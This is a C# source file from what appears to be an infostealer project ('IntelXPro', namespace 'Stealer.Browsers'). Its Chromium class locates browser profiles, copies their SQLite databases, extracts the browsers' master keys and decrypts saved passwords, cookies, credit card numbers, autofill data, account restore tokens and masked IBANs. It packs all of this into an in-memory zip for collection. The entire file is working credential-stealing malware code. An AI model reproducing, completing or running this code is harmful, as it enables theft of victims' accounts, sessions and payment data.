using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using IntelXPro.src.IntelXPro.Dependencies.General;
using IntelXPro.src.IntelXPro.Dependencies.Sql;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Browsers
{
    internal class Chromium : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Parallel.ForEach(Paths.Chromium, delegate (string browser)
            {
                if (Directory.Exists(browser))
                {
                    Parallel.ForEach(Directory.GetDirectories(browser), delegate (string profile)
                    {
                        ProfileCollect(zip, counter, browser, profile);
                    });
                }
            });
        }

        private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
        {
            string localstate = browser + "\\Local State";
            string browsername = Paths.GetBrowserName(browser);
            string profilename = Path.GetFileName(profile);
            byte[] masterv10 = LocalState.MasterKeyV10(localstate);
            byte[] masterv20 = LocalState.MasterKeyV20(localstate);
            Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
            counterBrowser.Profile = profile;
            counterBrowser.BrowserName = browsername;
            object[][] source = new object[7][]
            {
            new object[3]
            {
                "Login Data",
                Path.Combine(profile, "Login Data"),
                new string[1] { "logins" }
            },
            new object[3]
            {
                "Login Data For Account",
                Path.Combine(profile, "Login Data For Account"),
                new string[1] { "logins" }
            },
            new object[3]
            {
                "Network Cookies",
                Path.Combine(profile, "Network", "Cookies"),
                new string[1] { "cookies" }
            },
            new object[3]
            {
                "Cookies",
                Path.Combine(profile, "Cookies"),
                new string[1] { "cookies" }
            },
            new object[3]
            {
                "Web Data",
                Path.Combine(profile, "Web Data"),
                new string[5] { "AutoFill", "credit_cards", "token_service", "masked_credit_cards", "masked_ibans" }
            },
            new object[3]
            {
                "Ya Passman Data",
                Path.Combine(profile, "Ya Passman Data"),
                new string[1] { "logins" }
            },
            new object[3]
            {
                "Ya Credit Cards",
                Path.Combine(profile, "Ya Credit Cards"),
                new string[1] { "records" }
            }
            };
            Dictionary<string, Action<SqLite>> handlers = new Dictionary<string, Action<SqLite>>(StringComparer.OrdinalIgnoreCase)
        {
            {
                "Login Data/logins",
                delegate(SqLite sSqLite)
                {
                    Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Login Data For Account/logins",
                delegate(SqLite sSqLite)
                {
                    Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Cookies/cookies",
                delegate(SqLite sSqLite)
                {
                    Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Network Cookies/cookies",
                delegate(SqLite sSqLite)
                {
                    Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Web Data/AutoFill",
                delegate(SqLite sSqLite)
                {
                    AutoFill(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Web Data/credit_cards",
                delegate(SqLite sSqLite)
                {
                    CreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Web Data/token_service",
                delegate(SqLite sSqLite)
                {
                    TokenRestore(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Web Data/masked_credit_cards",
                delegate(SqLite sSqLite)
                {
                    MaskCreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Web Data/masked_ibans",
                delegate(SqLite sSqLite)
                {
                    MaskedIbans(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Ya Passman Data/logins",
                delegate(SqLite sSqLite)
                {
                    YandexPassword(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            },
            {
                "Ya Credit Cards/records",
                delegate(SqLite sSqLite)
                {
                    YandexGetCard(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
                }
            }
        };
            Parallel.ForEach(source, delegate (object[] file)
            {
                string name = (string)file[0];
                string path = (string)file[1];
                string[] source2 = (string[])file[2];
                if (File.Exists(path))
                {
                    byte[] bytes;
                    try
                    {
                        string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".tmp");
                        File.Copy(path, tempFile, true);
                        bytes = File.ReadAllBytes(tempFile);
                        File.Delete(tempFile);
                    }
                    catch
                    {
                        return;
                    }
                    Parallel.ForEach(source2, delegate (string table)
                    {
                        try
                        {
                            SqLite sqLite = new SqLite(bytes);
                            sqLite.ReadTable(table);
                            string key = name + "/" + table;
                            if (handlers.TryGetValue(key, out var value))
                            {
                                value(sqLite);
                            }
                        }
                        catch
                        {
                        }
                    });
                }
            });
            if ((long)counterBrowser.Cookies != 0L || (long)counterBrowser.Password != 0L || (long)counterBrowser.CreditCards != 0L || (long)counterBrowser.AutoFill != 0L || (long)counterBrowser.RestoreToken != 0L || (long)counterBrowser.MaskCreditCard != 0L || (long)counterBrowser.MaskedIban != 0L)
            {
                counter.Browsers.Add(counterBrowser);
            }
        }

        private void Password(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null && masterv20 == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>();
            Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 0);
                    string value2 = sSqLite.GetValue(i, 3);
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 5));
                    if (bytes != null && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2))
                    {
                        byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, checkprefix: false);
                        if (array != null)
                        {
                            string text = Encoding.UTF8.GetString(array);
                            string item = "Hostname: " + value + "\nUsername: " + value2 + "\nPassword: " + text + "\n\n";
                            lines.Add(item);
                            ++counterBrowser.Password;
                        }
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("Passwords\\Passwords_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void Cookies(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null && masterv20 == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 5));
                    string value = sSqLite.GetValue(i, 4);
                    string value2 = sSqLite.GetValue(i, 1);
                    string value3 = sSqLite.GetValue(i, 3);
                    string value4 = sSqLite.GetValue(i, 6);
                    string value5 = sSqLite.GetValue(i, 7);
                    if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3) && !string.IsNullOrEmpty(value4) && !string.IsNullOrEmpty(value5))
                    {
                        if (!string.IsNullOrEmpty(value))
                        {
                            string item = value2 + "\tTRUE\t" + value4 + "\tFALSE\t" + value5 + "\t" + value3 + "\t" + value + "\n";
                            lines.Add(item);
                        }
                        else
                        {
                            byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, checkprefix: true);
                            if (array != null)
                            {
                                string text = Encoding.UTF8.GetString(array);
                                string item2 = value2 + "\tTRUE\t" + value4 + "\tFALSE\t" + value5 + "\t" + value3 + "\t" + text + "\n";
                                lines.Add(item2);
                                ++counterBrowser.Cookies;
                            }
                        }
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("Cookies\\Cookies_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 0);
                    string value2 = sSqLite.GetValue(i, 1);
                    if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value))
                    {
                        string item = "Name: " + value + "\nValue: " + value2 + "\n\n";
                        lines.Add(item);
                        ++counterBrowser.AutoFill;
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("AutoFills\\AutoFill_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void CreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null && masterv20 == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 4));
                    string value = sSqLite.GetValue(i, 3);
                    string value2 = sSqLite.GetValue(i, 2);
                    string value3 = sSqLite.GetValue(i, 1);
                    if (bytes != null && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
                    {
                        byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, checkprefix: false);
                        if (array != null)
                        {
                            string text = Encoding.UTF8.GetString(array);
                            string item = "Number: " + text + "\nExp: " + value2 + "/" + value + "\nHolder: " + value3 + "\n\n";
                            lines.Add(item);
                            ++counterBrowser.CreditCards;
                        }
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("CreditCards\\CreditCards_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void TokenRestore(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null && masterv20 == null)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 0);
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 1));
                    if (bytes != null)
                    {
                        byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, checkprefix: false);
                        if (array != null)
                        {
                            string text = Encoding.UTF8.GetString(array) + ":" + value.Replace("AccountId-", "") + "\n";
                            lines.Add(text);
                            ++counterBrowser.RestoreToken;
                            if (value.Contains("AccountId"))
                            {
                                zip.AddTextFile("Cookies\\CookiesRestore_[" + browsername + "]" + profilename + ".txt", RestoreCookies.CRestore(text));
                            }
                        }
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("RestoreToken\\RestoreToken_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void YandexPassword(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null)
            {
                return;
            }
            byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
            if (encryptionKey == null || encryptionKey.Length != 32)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 0);
                    string value2 = sSqLite.GetValue(i, 2);
                    string value3 = sSqLite.GetValue(i, 3);
                    string value4 = sSqLite.GetValue(i, 4);
                    string value5 = sSqLite.GetValue(i, 7);
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 5));
                    if (bytes.Length != 0)
                    {
                        byte[] bytes2 = YaAuthenticatedData.Decrypt(encryptionKey, bytes, value, value2, value4, value3, value5);
                        string item = "Hostname: " + value + "\nUsername: " + value3 + "\nPassword: " + Encoding.UTF8.GetString(bytes2) + "\n\n";
                        lines.Add(item);
                        ++counterBrowser.Password;
                    }
                }
                catch
                {
                }
            });
            zip.AddTextFile("Passwords\\Passwords_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void YandexGetCard(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            if (masterv10 == null)
            {
                return;
            }
            byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
            if (encryptionKey == null || encryptionKey.Length != 32)
            {
                return;
            }
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    byte[] bytes = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 0));
                    byte[] bytes2 = Encoding.GetEncoding(28591).GetBytes(sSqLite.GetValue(i, 2));
                    string value = sSqLite.GetValue(i, 1);
                    byte[] array = new byte[12];
                    Array.Copy(bytes2, 0, array, 0, 12);
                    int num = bytes2.Length - 12 - 16;
                    byte[] array2 = new byte[num];
                    Array.Copy(bytes2, 12, array2, 0, num);
                    byte[] array3 = new byte[16];
                    Array.Copy(bytes2, bytes2.Length - 16, array3, 0, 16);
                    string input = Encoding.UTF8.GetString(AesGcm256.Decrypt(encryptionKey, array, bytes, array2, array3));
                    Match match = Regex.Match(input, "[\"']?full_card_number[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
                    string text = (match.Success ? match.Groups["v"].Value.Trim() : null);
                    if (string.IsNullOrEmpty(text))
                    {
                        Match match2 = Regex.Match(input, "[\"']?(?:card_number|number)[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
                        text = (match2.Success ? match2.Groups["v"].Value.Trim() : null);
                    }
                    Match match3 = Regex.Match(value, "[\"']?expire_date_month[\"']?\\s*:\\s*[\"']?(?<m>\\d{1,2})[\"']?", RegexOptions.IgnoreCase);
                    Match match4 = Regex.Match(value, "[\"']?expire_date_year[\"']?\\s*:\\s*[\"']?(?<y>\\d{2,4})[\"']?", RegexOptions.IgnoreCase);
                    string text2 = (match3.Success ? match3.Groups["m"].Value.PadLeft(2, '0') : null);
                    string text3 = (match4.Success ? match4.Groups["y"].Value : null);
                    Match match5 = Regex.Match(value, "[\"']?card_holder[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
                    string text4 = (match5.Success ? match5.Groups["v"].Value : null);
                    if (string.IsNullOrEmpty(text4))
                    {
                        Match match6 = Regex.Match(value, "[\"']?(?:cardholder|holder|name)[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
                        text4 = (match6.Success ? match6.Groups["v"].Value : text4);
                    }
                    if (!string.IsNullOrEmpty(text4))
                    {
                        text4 = Regex.Unescape(text4);
                        text4 = Regex.Replace(text4, "\\\\u([0-9A-Fa-f]{4})", (Match m) => ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
                        text4 = text4.Trim();
                        if (Regex.IsMatch(text4, "^[A-Za-z0-9\\+/=]{8,}$"))
                        {
                            try
                            {
                                byte[] bytes3 = Convert.FromBase64String(text4);
                                string text5 = Encoding.UTF8.GetString(bytes3);
                                if (!string.IsNullOrWhiteSpace(text5))
                                {
                                    text4 = text5.Trim();
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                    if (string.IsNullOrEmpty(text))
                    {
                        text = "Unknown";
                    }
                    if (string.IsNullOrEmpty(text2))
                    {
                        text2 = "Unknown";
                    }
                    if (string.IsNullOrEmpty(text3))
                    {
                        text3 = "Unknown";
                    }
                    if (string.IsNullOrEmpty(text4))
                    {
                        text4 = "Unknown";
                    }
                    string item = "Number: " + text + "\nExp: " + text2 + "/" + text3 + "\nHolder: " + text4 + "\n\n";
                    lines.Add(item);
                    ++counterBrowser.CreditCards;
                }
                catch
                {
                }
            });
            zip.AddTextFile("CreditCards\\CreditCards_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void MaskCreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 1);
                    string value2 = sSqLite.GetValue(i, 2);
                    string value3 = sSqLite.GetValue(i, 3);
                    string value4 = sSqLite.GetValue(i, 4);
                    string value5 = sSqLite.GetValue(i, 5);
                    string value6 = sSqLite.GetValue(i, 6);
                    string value7 = sSqLite.GetValue(i, 7);
                    string value8 = sSqLite.GetValue(i, 12);
                    string item = "Name On Card: " + value + "\nNetwork: " + value2 + "\nCard Last Number: " + value3 + "\nExp: " + value4 + "/" + value5 + "\nBank Name: " + value6 + "\nNickName: " + value7 + "\nProduct Description: " + value8 + "\n\n";
                    lines.Add(item);
                    ++counterBrowser.MaskCreditCard;
                }
                catch
                {
                }
            });
            zip.AddTextFile("MaskCreditCards\\MaskCreditCards_[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }

        private void MaskedIbans(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
        {
            ConcurrentBag<string> lines = new ConcurrentBag<string>(); Parallel.For(0, sSqLite.GetRowCount(), delegate (int i)
            {
                try
                {
                    string value = sSqLite.GetValue(i, 1);
                    string value2 = sSqLite.GetValue(i, 2);
                    string value3 = sSqLite.GetValue(i, 3);
                    string item = "Nickname: " + value3 + "\nPrefix: " + value + "\nSuffix: " + value2 + "\n\n";
                    lines.Add(item);
                    ++counterBrowser.MaskedIban;
                }
                catch
                {
                }
            });
            zip.AddTextFile("MaskedIbans\\MaskedIbans[" + browsername + "]" + profilename + ".txt", string.Concat(lines));
        }
    }
}








